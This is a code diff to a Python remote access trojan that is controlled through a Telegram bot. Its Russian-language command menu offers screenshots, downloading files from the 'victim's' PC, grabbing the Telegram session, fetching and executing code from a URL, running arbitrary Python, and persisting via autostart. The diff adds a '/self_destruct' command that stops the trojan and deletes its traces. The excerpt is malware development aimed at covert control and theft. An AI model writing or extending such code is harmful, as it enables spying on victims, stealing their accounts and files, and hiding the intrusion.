@@ -91,8 +91,9 @@ def execute_code(message):
 def send_message_on_start():
     username = os.getlogin()
     bot.send_message(chat_id, f"Подключен пк: {username}")
-    bot.send_message(chat_id, "КОМАНДЫ: '\n' /capture_pc - скриншот'\n' /pc_info -  информация о пк'\n'/msg_box - вывести сообщение жертве: /msg_box текст'\n'/ip_info - инфо об айпи адресе'\n'/download_file - загрузить файл с пк жертвы: /download_file путь'\n'/list_dir - вывести все названия из папки: /list_dir путь до папки'\n'/run_file - запустить файл по пути'\n'/tg_grab - взять ссессию тг'\n' /url - подгрузка кода + последующее его выполнение'\n'/code - выполнить ваш код(пайтон)'\n' /avto - добавление в автозагрузку  ")
+    bot.send_message(chat_id, "КОМАНДЫ: '\n' /capture_pc - скриншот'\n'/self_destruct - остановить ратку и удалить следы\n /pc_info -  информация о пк'\n'/msg_box - вывести сообщение жертве: /msg_box текст'\n'/ip_info - инфо об айпи адресе'\n'/download_file - загрузить файл с пк жертвы: /download_file путь'\n'/list_dir - вывести все названия из папки: /list_dir путь до папки'\n'/run_file - запустить файл по пути'\n'/tg_grab - взять ссессию тг'\n' /url - подгрузка кода + последующее его выполнение'\n'/code - выполнить ваш код(пайтон)'\n' /avto - добавление в автозагрузку  ")
     itembtn1 = types.KeyboardButton('/capture_pc')
+    itembtn2 = types.KeyboardButton('/self_destruct')
     itembtn3 = types.KeyboardButton('/pc_info')
     itembtn4 = types.KeyboardButton('/msg_box')
     itembtn5 = types.KeyboardButton('/ip_info')
@@ -314,6 +315,7 @@ def start(message):
     chat_id = message.chat.id
     markup = types.ReplyKeyboardMarkup(row_width=1)
     itembtn1 = types.KeyboardButton('/capture_pc')
+    itembtn2 = types.KeyboardButton('/self_destruct')
     itembtn3 = types.KeyboardButton('/pc_info')
     itembtn4 = types.KeyboardButton('/msg_box')
     itembtn5 = types.KeyboardButton('/ip_info')
@@ -323,7 +325,7 @@ def start(message):
     itembtn9 = types.KeyboardButton('/tg_grab')
     itembtn10 = types.KeyboardButton('/avto')
     itembtn11 = types.KeyboardButton('/code')
-    markup.add(itembtn1, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
+    markup.add(itembtn1,itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
     bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
 
 print('СЛУШАЮ КОМАНДЫ...')
